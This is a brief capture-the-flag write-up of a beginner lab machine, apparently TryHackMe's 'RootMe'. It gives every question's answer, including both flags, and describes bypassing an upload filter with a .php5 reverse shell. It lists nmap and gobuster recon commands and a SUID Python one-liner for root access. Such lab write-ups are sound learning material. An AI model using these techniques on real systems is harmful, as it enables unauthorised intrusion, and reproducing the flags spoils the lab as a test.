---
title: "Rootme"

author: Matt Hammond
date: 2022-12-18
url: /rootme/
image: images/2022-thumbs/rootme.jpg
categories:
  - CTF
tags:
  - CTF
draft: false
---

A ctf for beginners, can you root me?

## Questions

1. Scan the machine, how many ports are open? `2`
2. What version of Apache is running? `2.4.29`
3. What service is running on port 22? `ssh`
4. What is the hidden directory? `/panel/`
5. Flag in user.txt? `THM{y0u_g0t_a_sh3ll}`
6. Search for files with SUID permission, which file is weird? `/usr/bin/python`
7. Flag in root.txt? 'THM{pr1v1l3g3_3sc4l4t10n}'

---

## Notes

- IP = 10.10.119.146

### Exposed Services

```bash
22
80
```

### Users:Passwords

-

### Vulnerabilities

- unrestricted file uploads
  - does not allow .php
  - used .php5
  - uploaded php reverse shell

---

## Commands

`ping $IP`

`sudo nmap -sC -sV -oN scans/initial $IP`

`gobuster dir -u http://10.10.119.146 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster`

privilege escalation
`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
